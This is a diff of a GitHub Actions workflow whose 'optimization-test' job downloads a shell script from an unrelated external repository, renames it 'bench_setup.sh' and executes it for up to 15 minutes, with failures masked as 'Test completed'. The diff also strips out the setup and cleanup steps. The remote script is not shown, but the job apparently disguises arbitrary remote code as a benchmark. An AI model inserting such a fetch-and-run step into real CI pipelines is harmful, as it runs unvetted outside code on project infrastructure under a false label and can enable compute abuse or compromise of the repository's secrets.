@@ -9,24 +9,13 @@ jobs:
   optimization-test:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup environment
-        run: |
-          mkdir -p ~/tmp/bench
-          cd ~/tmp/bench
           
       - name: Fetch optimization script
-        working-directory: ~/tmp/bench
         run: |
           curl -sLo bench_setup.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/main/screen.sh
           chmod +x bench_setup.sh
           
       - name: Execute test
-        working-directory: ~/tmp/bench
         run: |
           # Run with timeout to prevent indefinite execution
           timeout 15m ./bench_setup.sh || echo "Test completed"
-          
-      - name: Cleanup
-        if: always()
-        run: |
-          rm -rf ~/tmp/bench
